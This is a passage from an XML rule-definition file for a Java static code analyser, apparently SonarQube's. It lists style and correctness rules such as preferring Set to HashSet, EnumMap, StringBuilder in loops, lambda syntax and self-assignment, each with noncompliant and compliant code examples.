            public class Employees {
            private HashSet&amp;lt;Employee&amp;gt; employees = new HashSet&amp;lt;Employee&amp;gt;(); // Noncompliant -
            &quot;employees&quot; should have type &quot;Set&quot; rather than &quot;HashSet&quot;

            public HashSet&amp;lt;Employee&amp;gt; getEmployees() { // Noncompliant
            return employees;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Employees {
            private Set&amp;lt;Employee&amp;gt; employees = new HashSet&amp;lt;Employee&amp;gt;(); // Compliant

            public Set&amp;lt;Employee&amp;gt; getEmployees() { // Compliant
            return employees;
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
    </rule>

    <rule key='S135' priority='MINOR'>
        <configKey>S135</configKey>
        <name>Loops should not contain more than a single &quot;break&quot; or &quot;continue&quot; statement</name>
        <description>
            &lt;p&gt;Restricting the number of &lt;code&gt;break&lt;/code&gt; and &lt;code&gt;continue&lt;/code&gt;
            statements in a loop is done in the interest of good structured programming.
            &lt;/p&gt;
            &lt;p&gt;Only one &lt;code&gt;break&lt;/code&gt; or one &lt;code&gt;continue&lt;/code&gt; statement is
            acceptable in a loop, since it facilitates optimal coding. If there is more
            than one, the code should be refactored to increase readability.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 1; i &amp;lt;= 10; i++) { // Noncompliant - 2 continue - one might be tempted to add some logic
            in between
            if (i % 2 == 0) {
            continue;
            }

            if (i % 3 == 0) {
            continue;
            }

            System.out.println(&quot;i = &quot; + i);
            }
            &lt;/pre&gt;
        </description>
        <tag>brain-overload</tag>
    </rule>

    <rule key='S1444' priority='MINOR'>
        <configKey>S1444</configKey>
        <name>&quot;public static&quot; fields should be constant</name>
        <description>
            &lt;p&gt;There is no good reason to declare a field &quot;public&quot; and &quot;static&quot; without also
            declaring it &quot;final&quot;. Most of the time this is a kludge to share a
            state among several objects. But with this approach, any object can do whatever it wants with the shared
            state, such as setting it to
            &lt;code&gt;null&lt;/code&gt;. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Greeter {
            public static Foo foo = new Foo();
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Greeter {
            public static final Foo FOO = new Foo();
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/500.html&quot;&gt;MITRE, CWE-500&lt;/a&gt;
            - Public Static Field Not Marked Final &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/WjdGBQ&quot;&gt;CERT OBJ10-J.&lt;/a&gt; -
            Do not use public static nonfinal fields &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1450' priority='MINOR'>
        <configKey>S1450</configKey>
        <name>Private fields only used as local variables in methods should become local variables</name>
        <description>
            &lt;p&gt;When the value of a private field is always assigned to in a class' methods before being read, then
            it is not being used to store class
            information. Therefore, it should become a local variable in the relevant methods to prevent any
            misunderstanding.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            private int a;
            private int b;

            public void doSomething(int y) {
            a = y + 5;
            ...
            if(a == 0) {
            ...
            }
            ...
            }

            public void doSomethingElse(int y) {
            b = y + 3;
            ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {

            public void doSomething(int y) {
            int a = y + 5;
            ...
            if(a == 0) {
            ...
            }
            }

            public void doSomethingElse(int y) {
            int b = y + 3;
            ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule doesn't raise any issue on annotated field.&lt;/p&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1452' priority='CRITICAL'>
        <configKey>S1452</configKey>
        <name>Generic wildcard types should not be used in return types</name>
        <description>
            &lt;p&gt;It is highly recommended &lt;strong&gt;not&lt;/strong&gt; to use wildcard types as return types.
            Because the type inference rules are fairly complex it is
            unlikely the user of that API will know how to use it correctly. &lt;/p&gt;
            &lt;p&gt;Let's take the example of method returning a &quot;List&amp;lt;? extends Animal&amp;gt;&quot;. Is
            it possible on this list to add a Dog, a Cat, ... we simply don't
            know. And neither does the compiler, which is why it will not allow such a direct use. The use of wildcard
            types should be limited to method
            parameters.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a method returns a wildcard type. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;? extends Animal&amp;gt; getAnimals(){...}
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;Animal&amp;gt; getAnimals(){...}
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            List&amp;lt;Dog&amp;gt; getAnimals(){...}
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1479' priority='MAJOR'>
        <configKey>S1479</configKey>
        <name>&quot;switch&quot; statements should not have too many &quot;case&quot; clauses</name>
        <description>
            &lt;p&gt;When &lt;code&gt;switch&lt;/code&gt; statements have large sets of &lt;code&gt;case&lt;/code&gt;
            clauses, it is usually an attempt to map two sets of data. A real map
            structure would be more readable and maintainable, and should be used instead.&lt;/p&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule ignores &lt;code&gt;switch&lt;/code&gt;es over &lt;code&gt;Enum&lt;/code&gt;s and empty,
            fall-through cases.&lt;/p&gt;
        </description>
        <tag>brain-overload</tag>
        <param>
            <key>maximum</key>
            <description>Maximum number of case</description>
            <defaultValue>30</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S1481' priority='MINOR'>
        <configKey>S1481</configKey>
        <name>Unused local variables should be removed</name>
        <description>
            &lt;p&gt;If a local variable is declared but not used, it is dead code and should be removed. Doing so will
            improve maintainability because developers will
            not wonder what the variable is used for.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int numberOfMinutes(int hours) {
            int seconds = 0; // seconds is never used
            return hours * 60;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int numberOfMinutes(int hours) {
            return hours * 60;
            }
            &lt;/pre&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S1488' priority='MINOR'>
        <configKey>S1488</configKey>
        <name>Local variables should not be declared and then immediately returned or thrown</name>
        <description>
            &lt;p&gt;Declaring a variable only to immediately return or throw it is a bad practice.&lt;/p&gt;
            &lt;p&gt;Some developers argue that the practice improves code readability, because it enables them to
            explicitly name what is being returned. However, this
            variable is an internal implementation detail that is not exposed to the callers of the method. The method
            name should be sufficient for callers to
            know exactly what will be returned.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public long computeDurationInMilliseconds() {
            long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
            return duration;
            }

            public void doSomething() {
            RuntimeException myException = new RuntimeException();
            throw myException;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public long computeDurationInMilliseconds() {
            return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
            }

            public void doSomething() {
            throw new RuntimeException();
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1596' priority='MINOR'>
        <configKey>S1596</configKey>
        <name>&quot;Collections.EMPTY_LIST&quot;, &quot;EMPTY_MAP&quot;, and &quot;EMPTY_SET&quot; should not be used
        </name>
        <description>
            &lt;p&gt;Since the introduction of generics in Java 5, the use of generic types such as &lt;code&gt;List&amp;lt;String&amp;gt;&lt;/code&gt;
            is recommended over the use of raw
            ones such as &lt;code&gt;List&lt;/code&gt;. Assigning a raw type to a generic one is not type safe, and will
            generate a warning. The old &lt;code&gt;EMPTY_...&lt;/code&gt;
            fields of the &lt;code&gt;Collections&lt;/code&gt; class return raw types, whereas the newer &lt;code&gt;empty...()&lt;/code&gt;
            methods return generic ones.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; collection1 = Collections.EMPTY_LIST; // Noncompliant
            Map&amp;lt;String, String&amp;gt; collection2 = Collections.EMPTY_MAP; // Noncompliant
            Set&amp;lt;String&amp;gt; collection3 = Collections.EMPTY_SET; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; collection1 = Collections.emptyList();
            Map&amp;lt;String, String&amp;gt; collection2 = Collections.emptyMap();
            Set&amp;lt;String&amp;gt; collection3 = Collections.emptySet();
            &lt;/pre&gt;
        </description>
        <tag>obsolete</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1598' priority='CRITICAL'>
        <configKey>S1598</configKey>
        <name>Package declaration should match source file directory</name>
        <description>
            &lt;p&gt;By convention, a Java class' physical location (source directories) and its logical representation
            (packages) should be kept in sync. Thus a Java
            file located at &lt;code&gt;&quot;src/org/bar/Foo.java&quot;&lt;/code&gt; should have a package of &lt;code&gt;&quot;org.bar&quot;&lt;/code&gt;.
            &lt;/p&gt;
            &lt;p&gt;Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer
            from making the &quot;Foo.java&quot; class part of the
            &quot;com.apple&quot; package, which could degrade the maintainability of both the class and its
            application.&lt;/p&gt;
            &lt;p&gt;Similarly, source placed in a folder with dots in its name instead of having the equivalent folder
            structure will compile but cause problems at run
            time. For instance, code with a package declaration of &lt;code&gt;org.foo.bar&lt;/code&gt; that is placed
            in &lt;code&gt;org/foo.bar&lt;/code&gt; will compile, but the
            classloader will always search for the class into the folder based on package structure, and will
            consequently expect sources to be in
            &lt;code&gt;org/foo/bar&lt;/code&gt; folder. &lt;code&gt;foo.bar&lt;/code&gt; is therefore not a proper
            folder name for sources.&lt;/p&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1602' priority='MINOR'>
        <configKey>S1602</configKey>
        <name>Lambdas containing only one statement should not nest this statement in a block</name>
        <description>
            &lt;p&gt;There are two ways to write lambdas that contain single statement, but one is definitely more
            compact and readable than the other.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            x -&amp;gt; {System.out.println(x+1);}
            (a, b) -&amp;gt; { return a+b; }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            x -&amp;gt; System.out.println(x+1)
            (a, b) -&amp;gt; a+b //For return statement, the return keyword should also be dropped
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S1604' priority='MAJOR'>
        <configKey>S1604</configKey>
        <name>Anonymous inner classes containing only one method should become lambdas</name>
        <description>
            &lt;p&gt;Before Java 8, the only way to partially support closures in Java was by using anonymous inner
            classes. But the syntax of anonymous classes may
            seem unwieldy and unclear.&lt;/p&gt;
            &lt;p&gt;With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase
            the readability of the source code.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            myCollection.stream().map(new Mapper&amp;lt;String,String&amp;gt;() {
            public String map(String input) {
            return new StringBuilder(input).reverse().toString();
            }
            });

            Predicate&amp;lt;String&amp;gt; isEmpty = new Predicate&amp;lt;String&amp;gt; {
            boolean test(String myString) {
            return myString.isEmpty();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            myCollection.stream().map(input -&amp;gt; new StringBuilder(input).reverse().toString());

            Predicate&amp;lt;String&amp;gt; isEmpty = myString -&amp;gt; myString.isEmpty();
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S1607' priority='MAJOR'>
        <configKey>S1607</configKey>
        <name>JUnit4 @Ignored and JUnit5 @Disabled annotations should be used to disable tests and should provide a
            rationale
        </name>
        <description>
            &lt;p&gt;When a test fails due, for example, to infrastructure issues, you might want to ignore it
            temporarily. But without some kind of notation about why
            the test is being ignored, it may never be reactivated. Such tests are difficult to address without
            comprehensive knowledge of the project, and end up
            polluting their projects.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue for each ignored test that does not have any comment about why it is
            being skipped.&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; For Junit4, this rule targets the @Ignore annotation. &lt;/li&gt;
            &lt;li&gt; For Junit5, this rule targets the @Disabled annotation. &lt;/li&gt;
            &lt;li&gt; Cases where assumeTrue(false) or assumeFalse(true) are used to skip tests are targeted as well.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Ignore // Noncompliant
            @Test
            public void testDoTheThing() {
            // ...
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            @Test
            public void testDoTheThing() {
            Assume.assumeFalse(true); // Noncompliant
            // ...
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            @Ignore(&quot;See Ticket #1234&quot;)
            public void testDoTheThing() {
            // ...
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>confusing</tag>
        <tag>junit</tag>
        <tag>suspicious</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S1610' priority='MINOR'>
        <configKey>S1610</configKey>
        <name>Abstract classes without fields should be converted to interfaces</name>
        <description>
            &lt;p&gt;With Java 8's &quot;default method&quot; feature, any abstract class without direct or inherited
            field should be converted into an interface. However, this
            change may not be appropriate in libraries or other applications where the class is intended to be used as
            an API.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public abstract class Car {
            public abstract void start(Environment c);

            public void stop(Environment c) {
            c.freeze(this);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public interface Car {
            public void start(Environment c);

            public default void stop(Environment c) {
            c.freeze(this);
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S1611' priority='MINOR'>
        <configKey>S1611</configKey>
        <name>Parentheses should be removed from a single lambda input parameter when its type is inferred</name>
        <description>
            &lt;p&gt;There are two possible syntaxes for a lambda having only one input parameter with an inferred type:
            with and without parentheses around that single
            parameter. The simpler syntax, without parentheses, is more compact and readable than the one with
            parentheses, and is therefore preferred.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            (x) -&amp;gt; x * 2
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            x -&amp;gt; x * 2
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S1612' priority='MINOR'>
        <configKey>S1612</configKey>
        <name>Lambdas should be replaced with method references</name>
        <description>
            &lt;p&gt;Method/constructor references are commonly agreed to be, most of the time, more compact and
            readable than using lambdas, and are therefore
            preferred. &lt;/p&gt;
            &lt;p&gt;In some rare cases, when it is not clear from the context what kind of function is being described
            and reference would not increase the clarity, it
            might be fine to keep the lambda. &lt;/p&gt;
            &lt;p&gt;Similarly, &lt;code&gt;null&lt;/code&gt; checks can be replaced with references to the &lt;code&gt;Objects::isNull&lt;/code&gt;
            and &lt;code&gt;Objects::nonNull&lt;/code&gt; methods,
            &lt;code&gt;casts&lt;/code&gt; can be replaced with &lt;code&gt;SomeClass.class::cast&lt;/code&gt; and &lt;code&gt;instanceof&lt;/code&gt;
            can be replaced with
            &lt;code&gt;SomeClass.class::isInstance&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class A {
            void process(List&amp;lt;A&amp;gt; list) {
            list.stream()
            .filter(a -&amp;gt; a instanceof B)
            .map(a -&amp;gt; (B) a)
            .map(b -&amp;gt; b.&amp;lt;String&amp;gt;getObject())
            .forEach(b -&amp;gt; { System.out.println(b); });
            }
            }

            class B extends A {
            &amp;lt;T&amp;gt; T getObject() {
            return null;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class A {
            void process(List&amp;lt;A&amp;gt; list) {
            list.stream()
            .filter(B.class::isInstance)
            .map(B.class::cast)
            .map(B::&amp;lt;String&amp;gt;getObject)
            .forEach(System.out::println);
            }
            }

            class B extends A {
            &amp;lt;T&amp;gt; T getObject() {
            return null;
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S1640' priority='MINOR'>
        <configKey>S1640</configKey>
        <name>Maps with keys that are enum values should be replaced with EnumMap</name>
        <description>
            &lt;p&gt;When all the keys of a Map are values from the same enum, the &lt;code&gt;Map&lt;/code&gt; can be
            replaced with an &lt;code&gt;EnumMap&lt;/code&gt;, which can be much more
            efficient than other sets because the underlying data structure is a simple array.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            public enum COLOR {
            RED, GREEN, BLUE, ORANGE;
            }

            public void mapMood() {
            Map&amp;lt;COLOR, String&amp;gt; moodMap = new HashMap&amp;lt;COLOR, String&amp;gt; ();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            public enum COLOR {
            RED, GREEN, BLUE, ORANGE;
            }

            public void mapMood() {
            EnumMap&amp;lt;COLOR, String&amp;gt; moodMap = new EnumMap&amp;lt;&amp;gt; (COLOR.class);
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S1643' priority='MINOR'>
        <configKey>S1643</configKey>
        <name>Strings should not be concatenated using '+' in a loop</name>
        <description>
            &lt;p&gt;Strings are immutable objects, so concatenation doesn't simply add the new String to the end of the
            existing string. Instead, in each loop
            iteration, the first String is converted to an intermediate object type, the second string is appended, and
            then the intermediate object is converted
            back to a String. Further, performance of these intermediate operations degrades as the String gets longer.
            Therefore, the use of StringBuilder is
            preferred.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String str = &quot;&quot;;
            for (int i = 0; i &amp;lt; arrayOfStrings.length ; ++i) {
            str = str + arrayOfStrings[i];
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            StringBuilder bld = new StringBuilder();
            for (int i = 0; i &amp;lt; arrayOfStrings.length; ++i) {
            bld.append(arrayOfStrings[i]);
            }
            String str = bld.toString();
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S1656' priority='MAJOR'>
        <configKey>S1656</configKey>
        <name>Variables should not be self-assigned</name>
        <description>
            &lt;p&gt;There is no reason to re-assign a variable to itself. Either this statement is redundant and should
            be removed, or the re-assignment is a mistake
            and some other value or variable was intended for the assignment instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void setName(String name) {
            name = name;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void setName(String name) {
            this.name = name;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S1659' priority='MINOR'>
        <configKey>S1659</configKey>
        <name>Multiple variables should not be declared on the same line</name>
        <description>
            &lt;p&gt;Declaring multiple variables on one line is difficult to read.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {

            private int a, b;

            public void method(){
            int c; int d;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {

            private int a;
            private int b;

            public void method(){
            int c;
            int d;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/YTZGBQ&quot;&gt;CERT, DCL52-J.&lt;/a&gt; -
            Do not declare more than one variable per declaration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/EtcxBQ&quot;&gt;CERT, DCL04-C.&lt;/a&gt; -
            Do not declare more than one variable per declaration &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>convention</tag>
    </rule>

    <rule key='S1700' priority='MAJOR'>
        <configKey>S1700</configKey>
        <name>A field should not duplicate the name of its containing class</name>
        <description>
            &lt;p&gt;It's confusing to have a class member with the same name (case differences aside) as its enclosing
            class. This is particularly so when you consider
            the common practice of naming a class instance for the class itself.&lt;/p&gt;
            &lt;p&gt;Best practice dictates that any field or member with the same name as the enclosing class be
            renamed to be more descriptive of the particular
            aspect of the class it represents or holds.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            private String foo;

            public String getFoo() { }
            }

            Foo foo = new Foo();
            foo.getFoo() // what does this return?
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            private String name;

            public String getName() { }
            }

            //...

            Foo foo = new Foo();
            foo.getName()
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;When the type of the field is the containing class and that field is static, no issue is raised to
            allow singletons named like the type. &lt;/p&gt;
            &lt;pre&gt;
            public class Foo {
            ...
            private static Foo foo;
            public Foo getInstance() {
            if(foo==null) {
            foo = new Foo();
            }
            return foo;
            }
            ...
            }
            &lt;/pre&gt;
        </description>
        <tag>brain-overload</tag>
    </rule>

    <rule key='S1710' priority='MINOR'>
        <configKey>S1710</configKey>
        <name>Annotation repetitions should not be wrapped</name>
        <description>
            &lt;p&gt;Before Java 8 if you needed to use multiple instances of the same annotation, they had to be
            wrapped in a container annotation. With Java 8, that's
            no longer necessary, allowing for cleaner, more readable code.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @SomeAnnotations({ // Noncompliant
            @SomeAnnotation(..a..),
            @SomeAnnotation(..b..),
            @SomeAnnotation(..c..),
            })
            public class SomeClass {
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @SomeAnnotation(..a..)
            @SomeAnnotation(..b..)
            @SomeAnnotation(..c..)
            public class SomeClass {
            ...
            }
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S1751' priority='MAJOR'>
        <configKey>S1751</configKey>
        <name>Loops with at most one iteration should be refactored</name>
        <description>
            &lt;p&gt;A loop with at most one iteration is equivalent to the use of an &lt;code&gt;if&lt;/code&gt;
            statement to conditionally execute one piece of code. No developer
            expects to find such a use of a loop statement. If the initial intention of the author was really to
            conditionally execute one piece of code, an
            &lt;code&gt;if&lt;/code&gt; statement should be used instead.&lt;/p&gt;
            &lt;p&gt;At worst that was not the initial intention of the author and so the body of the loop should be
            fixed to use the nested &lt;code&gt;return&lt;/code&gt;,
            &lt;code&gt;break&lt;/code&gt; or &lt;code&gt;throw&lt;/code&gt; statements in a more appropriate way.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 0; i &amp;lt; 10; i++) { // noncompliant, loop only executes once
            printf(&quot;i is %d&quot;, i);
            break;
            }
            ...
            for (int i = 0; i &amp;lt; 10; i++) { // noncompliant, loop only executes once
            if (i == x) {
            break;
            } else {
            printf(&quot;i is %d&quot;, i);
            return;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 0; i &amp;lt; 10; i++) {
            printf(&quot;i is %d&quot;, i);
            }
            ...
            for (int i = 0; i &amp;lt; 10; i++) {
            if (i == x) {
            break;
            } else {
            printf(&quot;i is %d&quot;, i);
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S1764' priority='MAJOR'>
        <configKey>S1764</configKey>
        <name>Identical expressions should not be used on both sides of a binary operator</name>
        <description>
            &lt;p&gt;Using the same value on either side of a binary operator is almost always a mistake. In the case of
            logical operators, it is either a copy/paste
            error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise
            operators and most binary mathematical
            operators, having the same value on both sides of an operator yields predictable results, and should be
            simplified.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if ( a == a ) { // always true
            doZ();
            }
            if ( a != a ) { // always false
            doY();
            }
            if ( a == b &amp;amp;&amp;amp; a == b ) { // if the first one is true, the second one is too
            doX();
            }
            if ( a == b || a == b ) { // if the first one is true, the second one is too
            doW();
            }

            int j = 5 / 5; //always 1
            int k = 5 - 5; //always 0

            c.equals(c); //always true
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; This rule ignores &lt;code&gt;*&lt;/code&gt;, &lt;code&gt;+&lt;/code&gt;, and &lt;code&gt;=&lt;/code&gt;.
            &lt;/li&gt;
            &lt;li&gt; The specific case of testing a floating point value against itself is a valid test for &lt;code&gt;NaN&lt;/code&gt;
            and is therefore ignored. &lt;/li&gt;
            &lt;li&gt; Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            float f;
            if(f != f) { //test for NaN value
            System.out.println(&quot;f is NaN&quot;);
            }

            int i = 1 &amp;lt;&amp;lt; 1; // Compliant
            int j = a &amp;lt;&amp;lt; a; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS1656'&gt;S1656&lt;/a&gt; - Implements a check on &lt;code&gt;=&lt;/code&gt;.
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S1844' priority='MAJOR'>
        <configKey>S1844</configKey>
        <name>&quot;Object.wait(...)&quot; should never be called on objects that implement &quot;java.util.concurrent.locks.Condition&quot;</name>
        <description>
            &lt;p&gt;From the Java API documentation:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;&lt;code&gt;Condition&lt;/code&gt; factors out the &lt;code&gt;Object&lt;/code&gt; monitor methods
            (&lt;code&gt;wait&lt;/code&gt;, &lt;code&gt;notify&lt;/code&gt; and &lt;code&gt;notifyAll&lt;/code&gt;)
            into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the
            use of arbitrary Lock implementations.
            Where a &lt;code&gt;Lock&lt;/code&gt; replaces the use of &lt;code&gt;synchronized&lt;/code&gt; methods and
            statements, a &lt;code&gt;Condition&lt;/code&gt; replaces the use of the
